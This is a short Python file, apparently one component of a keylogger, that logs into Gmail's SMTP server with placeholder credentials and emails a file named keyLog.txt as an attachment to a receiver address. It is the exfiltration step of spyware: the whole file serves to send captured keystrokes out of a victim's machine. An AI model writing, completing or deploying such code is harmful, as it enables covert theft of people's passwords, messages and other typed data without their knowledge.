# ........... this code is written in python ................... 
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# creating the mail class
class Mail:
    sender_email = "sender_mail@gmail.com"
    receiver_email = "reciever_mail@gmail.com"

    def sendMail(self):
        email_session = smtplib.SMTP('smtp.gmail.com',587) 
        email_session.starttls()
        email_session.login(self.sender_email,'sender_password')
        message = MIMEMultipart()
        message["From"] = self.sender_email
        message['To'] = self.receiver_email
        message['Subject'] = "sending mail using python"
        file = "keyLog.txt"
        attachment = open(file,'rb')
        obj = MIMEBase('application','octet-stream')
        obj.set_payload((attachment).read())
        encoders.encode_base64(obj)
        obj.add_header('Content-Disposition',"attachment; filename= "+file)
        message.attach(obj)
        my_message = message.as_string()
        email_session.sendmail(self.sender_email,self.receiver_email,my_message)
        print("Mail has been sent successfully with attachment of keyLog.txt file ")
        email_session.quit()








